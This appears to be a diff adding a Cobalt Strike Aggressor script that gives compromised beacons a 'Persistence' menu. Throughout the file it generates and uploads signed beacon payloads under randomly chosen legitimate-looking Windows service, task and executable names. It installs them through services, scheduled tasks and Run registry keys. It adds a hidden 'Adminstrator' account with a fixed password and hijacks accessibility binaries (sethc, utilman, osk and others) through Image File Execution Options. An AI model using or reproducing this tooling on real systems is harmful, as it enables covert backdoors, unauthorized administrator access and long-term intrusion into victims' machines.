@@ -1,0 +1,645 @@
+sub generate_random_service {
+	$list = @("perfmon", "efsui", "ChromeSVC", "ChromeUpdater", "svchost", "UserSVC", "Appinf", "AppSvc", "AudioEndpointBuild", "Audiosvc", "BFD", "BrokInfrastructure", "BTAGService", "BthAvctSvc", "bthsvc", "CDPSrv", "ClpSVC", "CoreMessagingRegister", "CriptSvc", "DcomLauncher", "DeviceAssociationSvc", "DhcpSvc", "DiagTrackSvc", "DispBrokerDesktop", "DnsCacheSvc", "DSvc", "DPSvc", "DsSvc", "DsmSvc", "EventLogSvc", "EventSystemSvc", "FontCacheSvc", "gposvc", "IKEEXTSVC", "InstallSvc", "iphlsvc", "KeyIsoSvc", "LanmanSrv", "LanmanWks", "LicenseMgr", "lmhost", "LSMSvc", "MPS", "NcbSvc", "NetlogonSvc", "netprof", "Nla", "nsisvc", "PcaSrv", "PlugPlaySvc", "PowerSvc", "ProfSrv", "RasManSvc", "RmSrv", "RpcEptMapperSvc", "RpcSsvc", "SamSsvc", "ScheduleSvc", "SecurityHealthSvc", "SENSvc", "SgrmBrokerSvc", "ShellHWDetectionSvc", "SpoolerSvc", "SSDPSVC", "SstpSrv", "StateRepositorySvc", "StorSrv", "SysMainSvc", "SystemEventsBroke", "TabletInputSvc", "ThemesSvc", "TimeBrokerSrv", "TokenBrokerSvc", "TrkSrv", "uhssrv", "UserManagerSvc", "UsoSrv", "VaultSrv", "VGAuthSvc", "vm3dsvc", "VMToolsSvc", "W32TimeSvc", "WbioSrv", "Wcmsrv", "WdiServiceHostSvc", "WdiSystemHostSvc", "WdNisSrv", "WinDefendSvc", "WinHttpAutoProxy", "WinmgmtSvc", "WpnSvc", "wscsrv", "WSearchSvc", "wuausvc");
+	return $list[int(rand() * size($list))];
+}
+
+sub generate_random_schtask {
+	$list = @("PolicyConvert", "VerifiedPublisherCertCheck", "CleanTemporaryState", "PcaPatchTask", "AppUriVerifierHourly", "ProxyTask", "UninstallerDeviceTask", "LocalUserSyncerDataAvailable", "UserTasker", "ProactivedScan", "DirectDatabaseUpdater", "SilentClean", "DXGAdapterCache", "ScheduleDefrag", "DiagnosticTask", "RefreshCached");
+	return $list[int(rand() * size($list))];
+}
+
+sub generate_random_admin_path {
+	$list = @("C:\\Windows\\Temp", "C:\\Windows\\Tasks", "C:\\Windows\\debug", "C:\\Windows\\Logs", "C:\\Users\\Default\\AppData\\Roaming", "C:\\Users\\Default\\AppData\\Local\\Temp", "C:\\ProgramData\\Microsoft\\Windows\\Templates", "C:\\ProgramData\\Microsoft\\Windows\\Caches");
+	return $list[int(rand() * size($list))];
+}
+
+sub generate_random_user_path {
+	$bid = $1;
+	$user = beacon_info($bid[0], "user");
+	$list = @("C:\\Users\\Public", "c:\\Users\\".$user, "c:\\Users\\".$user."\\AppData\\Roaming", "c:\\Users\\".$user."\\AppData\\Local\\Temp", "c:\\Users\\".$user."\\AppData\\Local\\Microsoft\\Vault");
+	return $list[int(rand() * size($list))];
+}
+
+sub generate_random_exe {
+	$list = @("Atbroker.exe", "Bash.exe", "Bitsadmin.exe", "Certutil.exe", "Cmdkey.exe", "Cmstp.exe", "Control.exe", "Csc.exe", "Cscript.exe", "Dfsvc.exe", "Diskshadow.exe", "Dnscmd.exe", "Esentutl.exe", "Extexport.exe", "Extrac32.exe", "Expand.exe", "Explorer.exe", "Findstr.exe", "Forfiles.exe", "Gpscript.exe", "Hh.exe", "Ieexec.exe", "Ie4uinit.exe", "Infdefaultinstall.exe", "Installutil.exe", "Makecab.exe", "Mavinject.exe", "Msbuild.exe", "Msconfig.exe", "Msdt.exe", "Mshta.exe", "Msiexec.exe", "Netsh.exe", "Nltest.exe", "Odbcconf.exe", "Openwith.exe", "Pcalua.exe", "Pcwrun.exe", "Powershell.exe", "Presentationhost.exe", "Print.exe", "Psr.exe", "Reg.exe", "Regedit.exe", "Regasm.exe", "Register-cimprovider.exe", "Regsvcs.exe", "Regsvr32.exe", "Replace.exe", "Robocopy.exe", "Rpcping.exe", "Rundll32.exe", "Runonce.exe", "Runscripthelper.exe", "Sc.exe", "Scriptrunner.exe", "Syncappvpublishingserver.exe", "Wab.exe", "Wmic.exe", "Wscript.exe", "Xwizard.exe", "Appvlp.exe", "Bginfo.exe", "Cdb.exe", "Csi.exe", "Dnx.exe", "Dxcap.exe", "Mftrace.exe", "Msdeploy.exe", "Msxsl.exe", "Rcsi.exe", "Sqldumper.exe", "Sqlps.exe", "Sqltoolsps.exe", "Te.exe", "Tracker.exe", "Vsjitdebugger.exe", "Winword.exe", "AcroRd32.exe", "Gpup.exe", "Nlnotes.exe", "Notes.exe", "Nvuhda6.exe", "Nvudisp.exe", "VBoxDrvInst.exe", "Usbinst.exe", "Setup.exe", "svchost.exe");
+	return $list[int(rand() * size($list))];
+}
+
+sub upload_artifact {
+	# Parameters
+	$bid = $1;
+	$path = $2;
+	$exe = $3;
+	$arch = $4;
+	$type = $5;
+	$listener = $6;
+
+	# generate artifact
+	$artifact = artifact_payload($listener, $type, $arch);
+	# sign artifact
+	$artifact = artifact_sign($artifact);
+	# save artifact
+	$handle = openf(">" . script_resource($exe));
+	writeb($handle, $artifact);
+	closef($handle);
+	sleep(3000);
+
+	# change path and upload artifact
+	bcd($bid, $path);
+	bupload($bid, script_resource($exe));
+
+	# Delete artifact after upload
+	exec("rm " . script_resource($exe));
+}
+
+# create a popup menu!
+popup beacon_bottom {
+	menu "Persistence" {
+		item "* Startup Folder (Upload executable) [Reboot]" {
+			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["path"] = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp";
+			%defaults["exe"] = generate_random_exe();
+			
+			# create our dialog
+			$dialog = dialog("Persistence via Startup Folder (Executable)", %defaults, lambda({
+				$options = $3;
+				$path = $options["path"];
+				$exe = $options["exe"];
+				$arch = iff($options["x64"] eq "true", "x64", "x86");
+				$type = "exe";
+				$listener = $options["listener"];
+
+				# Upload artifact
+				upload_artifact($bid, $path, $exe, $arch, $type, $listener);
+			}));
+
+			dialog_description($dialog, "Persistence via Windows Service (Executable)");
+			drow_text($dialog, "exe", "Exe: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "Startup Folder (Upload executable) [Reboot]" {
+			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+		
+			# setup our defaults
+			%defaults["path"] = "C:\\Users\\" . beacon_info($bid[0], "user") . "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+			%defaults["exe"] = generate_random_exe();
+			
+			# create our dialog
+			$dialog = dialog("Persistence via Startup Folder (Executable)", %defaults, lambda({
+				$options = $3;
+				$path = $options["path"];
+				$exe = $options["exe"];
+				$arch = iff($options["x64"] eq "true", "x64", "x86");
+				$type = "exe";
+				$listener = $options["listener"];
+
+				# Upload artifact
+				upload_artifact($bid, $path, $exe, $arch, $type, $listener);
+			}));
+
+			dialog_description($dialog, "Persistence via Windows Service (Executable)");
+			drow_text($dialog, "exe", "Exe: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "* Windows Service (Powershell command) [Reboot]" {
+			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["name"]  = generate_random_service();
+			%defaults["command"] = "net user Adminstrator Password123. /add; net localgroup Administrators Adminstrator /add";
+
+			# create our dialog
+			$dialog = dialog("Persistence via Windows Service (Powershell command)", %defaults, lambda({
+				$options = $3;
+				$name = $options["name"];
+				$command = $options["command"];
+
+				# Execute
+				$args = "-t service -c \"C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-ec " . transform($command, "powershell-base64") . "\" -n \"" . $name . "\" -m add";
+				# $args = "-t service -c \"C:\\Windows\\System32\\cmd.exe /k powershell -a \"-ec " . transform($command, "powershell-base64") . "\" -n \"" . $name . "\" -m add";
+				bexecute_assembly($bid, script_resource("SharPersist.exe"), $args);
+			}));
+
+			dialog_description($dialog, "Persistence via Windows Service (Powershell command)");
+			drow_text($dialog, "name", "Service name: ");
+			drow_text($dialog, "command", "Command (No char limit): ");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "* Windows Service (Upload executable) [Reboot]" {
+			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["name"]  = generate_random_service();
+			%defaults["path"] = generate_random_admin_path();
+			%defaults["exe"] = generate_random_exe();
+			
+			# create our dialog
+			$dialog = dialog("Persistence via Windows Service (Executable)", %defaults, lambda({
+				$options = $3;
+				$name = $options["name"];
+				$path = $options["path"];
+				$exe = $options["exe"];
+				$arch = iff($options["x64"] eq "true", "x64", "x86");
+				$type = "svcexe";
+				$listener = $options["listener"];
+
+				# Upload artifact
+				upload_artifact($bid, $path, $exe, $arch, $type, $listener);
+
+				# Execute
+				$args = "-t service -c \"" . $path . "\\" . $exe . "\" -n \"" . $name . "\" -m add";
+				bexecute_assembly($bid, script_resource("SharPersist.exe"), $args);
+			}));
+
+			dialog_description($dialog, "Persistence via Windows Service (Executable)");
+			drow_text($dialog, "name", "Service name: ");
+			drow_text($dialog, "path", "Path: ");
+			drow_text($dialog, "exe", "Exe: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "* Scheduled Task (Powershell command) [Logon/Hourly]" {
+			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["name"]  = generate_random_schtask();
+			%defaults["command"] = "net user Adminstrator Password123. /add; net localgroup Administrators Adminstrator /add";
+
+			# create our dialog
+			$dialog = dialog("Persistence via Scheduled Task (Powershell command)", %defaults, lambda({
+				$options = $3;
+				$name = $options["name"];
+				$command = $options["command"];
+
+				# Execute
+				$args = "-t schtask -c \"powershell\" -a \"-e " . transform($command, "powershell-base64") . "\" -n \"" . $name . "L\" -m add -o logon";
+				bexecute_assembly($bid, script_resource("SharPersist.exe"), $args);
+				$args = "-t schtask -c \"powershell\" -a \"-e " . transform($command, "powershell-base64") . "\" -n \"" . $name . "H\" -m add -o hourly";
+				bexecute_assembly($bid, script_resource("SharPersist.exe"), $args);
+			}));
+
+			dialog_description($dialog, "Persistence via Scheduled Task (Powershell command)");
+			drow_text($dialog, "name", "Scheduled Task name: ");
+			drow_text($dialog, "command", "Command (No char limit): ");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "* Scheduled Task (Upload executable) [Logon/Hourly]" {
+ 			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["name"]  = generate_random_schtask();
+			%defaults["path"] = generate_random_admin_path();
+			%defaults["exe"] = generate_random_exe();
+			
+			# create our dialog
+			$dialog = dialog("Persistence via Scheduled Task (Executable)", %defaults, lambda({
+				$options = $3;
+				$name = $options["name"];
+				$path = $options["path"];
+				$exe = $options["exe"];
+				$arch = iff($options["x64"] eq "true", "x64", "x86");
+				$type = "exe";
+				$listener = $options["listener"];
+
+				# Upload artifact
+				upload_artifact($bid, $path, $exe, $arch, $type, $listener);
+
+				# Execute
+				$args = "-t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/k " . $path . "\\" . $exe . "\" -n \"" . $name . "L\" -m add -o logon";
+				bexecute_assembly($bid, script_resource("SharPersist.exe"), $args);
+				$args = "-t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/k " . $path . "\\" . $exe . "\" -n \"" . $name . "H\" -m add -o hourly";
+				bexecute_assembly($bid, script_resource("SharPersist.exe"), $args);
+			}));
+
+			dialog_description($dialog, "Persistence via Scheduled Task (Executable)");
+			drow_text($dialog, "name", "Scheduled Task name: ");
+			drow_text($dialog, "path", "Path: ");
+			drow_text($dialog, "exe", "Exe: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "Scheduled Task (Powershell command) [Logon/Hourly]" {
+			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["name"]  = generate_random_schtask();
+			%defaults["command"] = "net user Adminstrator Password123. /add; net localgroup Administrators Adminstrator /add";
+
+			# create our dialog
+			$dialog = dialog("Persistence via Scheduled Task (Powershell command)", %defaults, lambda({
+				$options = $3;
+				$name = $options["name"];
+				$command = $options["command"];
+
+				# Execute
+				$command_hourly = "schtasks /create /sc HOURLY /tn \"" . $name . "\" /tr \"powershell -ec " . transform($command, "powershell-base64") . "\"";
+				bshell($bid, $command_hourly);
+			}));
+
+			dialog_description($dialog, "Persistence via Scheduled Task (Powershell command)");
+			drow_text($dialog, "name", "Scheduled Task name: ");
+			drow_text($dialog, "command", "Command (WebClient, IWR): ");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "Scheduled Task (Upload executable) [Logon/Hourly]" {
+ 			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["name"]  = generate_random_schtask();
+			%defaults["path"] = generate_random_user_path($bid);
+			%defaults["exe"] = generate_random_exe();
+			
+			# create our dialog
+			$dialog = dialog("Persistence via Scheduled Task (Executable)", %defaults, lambda({
+				$options = $3;
+				$name = $options["name"];
+				$path = $options["path"];
+				$exe = $options["exe"];
+				$arch = iff($options["x64"] eq "true", "x64", "x86");
+				$type = "exe";
+				$listener = $options["listener"];
+
+				# Upload artifact
+				upload_artifact($bid, $path, $exe, $arch, $type, $listener);
+
+				# Execute
+				$command_hourly = "schtasks /create /sc HOURLY /tn \"" . $name . "\" /tr \"" . $path . "\\" . $exe . "\"";
+				bshell($bid, $command_hourly);
+			}));
+
+			dialog_description($dialog, "Persistence via Scheduled Task (Executable)");
+			drow_text($dialog, "name", "Scheduled Task name: ");
+			drow_text($dialog, "path", "Path: ");
+			drow_text($dialog, "exe", "Exe: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "* Registry (Powershell command) [Logon]" {
+			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["name"]  = generate_random_schtask();
+			%defaults["command"] = "net user Adminstrator Password123. /add; net localgroup Administrators Adminstrator /add";
+			%defaults["type"] = "hklmrun";
+
+			# create our dialog
+			$dialog = dialog("Persistence via Registry (Powershell command)", %defaults, lambda({
+				$options = $3;
+				$name = $options["name"];
+				$command = $options["command"];
+				$type = $options["type"];
+
+				# Execute
+				$encoded_command = transform($command, "powershell-base64");
+				if (strlen($encoded_command) > 240) {
+					berror($bid, "Please choose a shorter powershell command");
+				} else {
+					$args = "-t reg -c \"powershell.exe\" -a \"-ec " . $encoded_command . "\" -v \"" . $name . "\" -m add -k \"" . $type . "\" -o env";
+					# $args = "-t reg -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-ec " . transform($command, "powershell-base64") . "\" -v \"" . $name . "\" -m add -o env -k \"" . $type . "\"";
+					bexecute_assembly($bid, script_resource("SharPersist.exe"), $args);
+				}
+			}));
+
+			dialog_description($dialog, "Persistence via Registry (Powershell command)");
+			drow_text($dialog, "name", "Key name: ");
+			drow_text($dialog, "command", "Command (WebClient, IWR): ");
+			drow_combobox($dialog, "type", "Type:", @("hklmrun", "hklmrunonce", "hkcurun", "hkcurunonce", "logonscript", "stickynotes"));
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "* Registry (Upload executable) [Logon]" {
+ 			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["name"]  = generate_random_schtask();
+			%defaults["path"] = generate_random_admin_path();
+			%defaults["exe"] = generate_random_exe();
+			%defaults["type"] = "hklmrun";
+
+			# create our dialog
+			$dialog = dialog("Persistence via Registry (Executable)", %defaults, lambda({
+				$options = $3;
+				$name = $options["name"];
+				$path = $options["path"];
+				$exe = $options["exe"];
+				$arch = iff($options["x64"] eq "true", "x64", "x86");
+				$type = "exe";
+				$listener = $options["listener"];
+
+				# Upload artifact
+				upload_artifact($bid, $path, $exe, $arch, $type, $listener);
+
+				# Execute
+				$args = "-t reg -c \"" . $path . "\\" . $exe . "\" -v \"" . $name . "\" -m add -o env -k \"" . $options["type"] . "\"";
+				# $args = "-t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/k " . $path . "\\" . $exe . "\" -v \"" . $name . "\" -m add -o env -k \"" . $options["type"] . "\"";
+
+				bexecute_assembly($bid, script_resource("SharPersist.exe"), $args);
+			}));
+
+			dialog_description($dialog, "Persistence via Registry (Executable)");
+			drow_text($dialog, "name", "Key name: ");
+			drow_text($dialog, "path", "Path: ");
+			drow_text($dialog, "exe", "Exe: ");
+			drow_combobox($dialog, "type", "Type:", @("hklmrun", "hklmrunonce", "hkcurun", "hkcurunonce", "logonscript", "stickynotes"));
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "Registry (Powershell command) [Logon]" {
+			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["name"]  = generate_random_schtask();
+			%defaults["command"] = "net user Adminstrator Password123. /add; net localgroup Administrators Adminstrator /add";
+			%defaults["type"] = "hkcurun";
+
+			# create our dialog
+			$dialog = dialog("Persistence via Registry (Powershell command)", %defaults, lambda({
+				$options = $3;
+				$name = $options["name"];
+				$command = $options["command"];
+				$type = $options["type"];
+
+				# Execute
+				$encoded_command = transform($command, "powershell-base64");
+				if (strlen($encoded_command) > 240) {
+					berror($bid, "Please choose a shorter powershell command");
+				} else {
+					$args = "-t reg -c \"powershell.exe\" -a \"-ec " . $encoded_command . "\" -v \"" . $name . "\" -m add -k \"" . $type . "\" -o env";
+					# $args = "-t reg -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-ec " . transform($command, "powershell-base64") . "\" -v \"" . $name . "\" -m add -o env -k \"" . $type . "\"";
+					bexecute_assembly($bid, script_resource("SharPersist.exe"), $args);
+				}
+			}));
+
+			dialog_description($dialog, "Persistence via Registry (Powershell command)");
+			drow_text($dialog, "name", "Key name: ");
+			drow_text($dialog, "command", "Command (WebClient, IWR): ");
+			drow_combobox($dialog, "type", "Type:", @("hkcurun", "hkcurunonce", "logonscript", "stickynotes"));
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "Registry (Upload executable) [Logon]" {
+ 			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["name"]  = generate_random_schtask();
+			%defaults["path"] = generate_random_user_path($bid);
+			%defaults["exe"] = generate_random_exe();
+			%defaults["type"] = "hkcurun";
+
+			# create our dialog
+			$dialog = dialog("Persistence via Registry (Executable)", %defaults, lambda({
+				$options = $3;
+				$name = $options["name"];
+				$path = $options["path"];
+				$exe = $options["exe"];
+				$arch = iff($options["x64"] eq "true", "x64", "x86");
+				$type = "exe";
+				$listener = $options["listener"];
+
+				# Upload artifact
+				upload_artifact($bid, $path, $exe, $arch, $type, $listener);
+
+				# Execute
+				$args = "-t reg -c \"" . $path . "\\" . $exe . "\" -v \"" . $name . "\" -m add -o env -k \"" . $options["type"] . "\"";
+				# $args = "-t reg -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/k " . $path . "\\" . $exe . "\" -v \"" . $name . "\" -m add -o env -k \"" . $options["type"] . "\"";
+
+				bexecute_assembly($bid, script_resource("SharPersist.exe"), $args);
+			}));
+
+			dialog_description($dialog, "Persistence via Registry (Executable)");
+			drow_text($dialog, "name", "Key name: ");
+			drow_text($dialog, "path", "Path: ");
+			drow_text($dialog, "exe", "Exe: ");
+			drow_combobox($dialog, "type", "Type:", @("hkcurun", "hkcurunonce", "logonscript", "stickynotes"));
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+		item "* Sticky Keys (CMD)" {
+			# Beacon ID
+			$bid = $1;
+
+			# reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+        	# reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+            # reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+			# reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+            # reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f        
+            # reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+            # reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\atbroker.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+        
+			# Sticky keys (F5 or Shift multiple times)
+			# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe";
+			# bshell($bid, $command);
+			$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f";
+ 			bshell($bid, $command);
+
+			# Accessibility Menu (Win + U)
+			# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe";
+			# bshell($bid, $command);
+			$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f";
+			bshell($bid, $command);
+
+			# On-Screen Keyboard
+			# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe";
+			# bshell($bid, $command);
+			$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f";
+			bshell($bid, $command);
+
+			# Magnifier
+			# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Magnify.exe";
+			# bshell($bid, $command);
+			$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnify.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f";
+			bshell($bid, $command);
+
+			# Narrator
+			# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Narrator.exe";
+			# bshell($bid, $command);
+			$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Narrator.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f";
+			bshell($bid, $command);
+
+			# Display Switcher
+			# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\DisplaySwitch.exe";
+			# bshell($bid, $command);
+			$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f";
+			bshell($bid, $command);
+
+			# App Switcher
+			# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\AtBroker.exe";
+			# bshell($bid, $command);
+			# $command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AtBroker.exe\" /t REG_SZ /v Debugger /d \"C:\\windows\\system32\\cmd.exe\" /f";
+			# bshell($bid, $command);
+		}
+
+		item "* Sticky Keys (Beacon)" {
+ 			local('$dialog %defaults');
+
+			# Beacon ID
+			$bid = $1;
+
+			# setup our defaults
+			%defaults["path"] = generate_random_admin_path();
+			%defaults["exe"] = generate_random_exe();
+
+			# create our dialog
+			$dialog = dialog("Persistence via Registry (Executable)", %defaults, lambda({
+				$options = $3;
+				$path = $options["path"];
+				$exe = $options["exe"];
+				$arch = iff($options["x64"] eq "true", "x64", "x86");
+				$type = "exe";
+				$listener = $options["listener"];
+
+				# Upload artifact
+				upload_artifact($bid, $path, $exe, $arch, $type, $listener);
+
+				# Adding sticky keys
+				# Sticky keys (F5 or Shift multiple times)
+				# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe";
+				# bshell($bid, $command);
+				$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /t REG_SZ /v Debugger /d \"" . $path . "\\" . $exe . "\" /f";
+				bshell($bid, $command);
+
+				# Accessibility Menu (Win + U)
+				# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe";
+				# bshell($bid, $command);
+				$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" /t REG_SZ /v Debugger /d \"" . $path . "\\" . $exe . "\" /f";
+				bshell($bid, $command);
+
+				# On-Screen Keyboard
+				# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe";
+				# bshell($bid, $command);
+				$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\" /t REG_SZ /v Debugger /d \"" . $path . "\\" . $exe . "\" /f";
+				bshell($bid, $command);
+
+				# Magnifier
+				# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Magnify.exe";
+				# bshell($bid, $command);
+				$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Magnify.exe\" /t REG_SZ /v Debugger /d \"" . $path . "\\" . $exe . "\" /f";
+				bshell($bid, $command);
+
+				# Narrator
+				# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Narrator.exe";
+				# bshell($bid, $command);
+				$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Narrator.exe\" /t REG_SZ /v Debugger /d \"" . $path . "\\" . $exe . "\" /f";
+				bshell($bid, $command);
+
+				# Display Switcher
+				# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\DisplaySwitch.exe";
+				# bshell($bid, $command);
+				$command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DisplaySwitch.exe\" /t REG_SZ /v Debugger /d \"" . $path . "\\" . $exe . "\" /f";
+				bshell($bid, $command);
+
+				# App Switcher
+				# $command = "copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\AtBroker.exe";
+				# bshell($bid, $command);
+				# $command = "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\AtBroker.exe\" /t REG_SZ /v Debugger /d \"" . $path . "\\" . $exe . "\" /f";
+				# bshell($bid, $command);
+			}));
+
+			dialog_description($dialog, "Sticky Keys (Beacon)");
+			drow_text($dialog, "path", "Path: ");
+			drow_text($dialog, "exe", "Exe: ");
+			drow_listener_stage($dialog, "listener", "Listener: ");
+			drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
+			dbutton_action($dialog, "Launch");
+
+			# show our dialog
+			dialog_show($dialog);
+		}
+
+	}
+}
+
+# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md
